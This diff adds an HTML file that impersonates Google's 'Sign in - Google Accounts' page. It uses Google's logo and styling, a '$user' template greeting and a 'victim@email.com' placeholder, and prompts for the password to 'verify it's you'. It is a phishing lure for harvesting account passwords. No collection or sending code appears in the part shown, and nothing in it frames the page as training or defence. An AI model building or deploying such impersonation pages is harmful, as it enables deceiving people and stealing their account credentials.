@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        <h1>Hi $user</h1>
+        <p class="email" style="font-weight:bold; text-align:left;">victim@email.com</p>
+        <p class="graytext">To continue, first verify it's you</p>
+        <input type="password" id="password" class="password" placeholder="Enter your password">
+        <div class="show-password-container">
+            <input type="checkbox" id="show-password" onclick="togglePassword()">
+            <label for="show-password">Show password</label>
+        </div>
+        <div class="footer-links">
+            <a href="#">Forgot password?</a>
+            <button class="button">Next</button>
+        </div>
+        <div class="footerfooter">
+            <a href="#">English (United States)</a>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var passwordField = document.getElementById("password");
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+            } else {
+                passwordField.type = "password";
+            }
+        }
+    </script>
+</body>
+</html>
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap');
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: #F0F4F9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+    .login-container {
+        background-color: #ffffff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+        text-align: left;
+        width: 360px;
+        position: relative;
+    }
+    .login-container img {
+        width: 75px;
+        margin-bottom: 20px;
+    }
+    h1 {
+        font-size: 24px;
+        color: #202124;
+        margin: 0;
+        font-family: 'Roboto', sans-serif;
+        text-align: left;
+    }
+    .email, .password {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border-radius: 8px;
+        border: 1px solid #dadce0;
+        box-sizing: border-box;
+    }
+    .email{
+        border-radius: 88px;
+        font-size: 13px;
+        line-height: 5px;
+    }
+    .button {
+        background-color: #1a73e8;
+        border-radius: 4px;
+        padding: 10px 24px;
+        color: white;
+        font-weight: 500;
+        font-size: 14px;
+        border: none;
+        cursor: pointer;
+        text-transform: uppercase;
+        margin-top: 24px;
+    }
+    .footer-links {
+        display: flex;
+        justify-content: space-between;
+        font-size: 12px;
+        margin-top: 20px;
+        color: #1a73e8;
+    }
+    .show-password-container {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        margin-top: 8px;
+    }
+    .show-password-container input {
+        margin-right: 8px;
+    }
+    a {
+        font-weight: bold;
+        text-decoration: none;
+        color: #1a73e8;
+    }
+    .footerfooter {
+        display: flex;
+        justify-content: center;
+        color: #757575;
+        font-size: 13px;
+        margin-top: 20px;
+        padding-top: 10px;
+        border-top: 1px solid #e0e0e0;
+        width: 100%;
+        text-align: center;
+    }
+    .footerfooter a {
+        margin: 0 10px;
+    }
+</style>
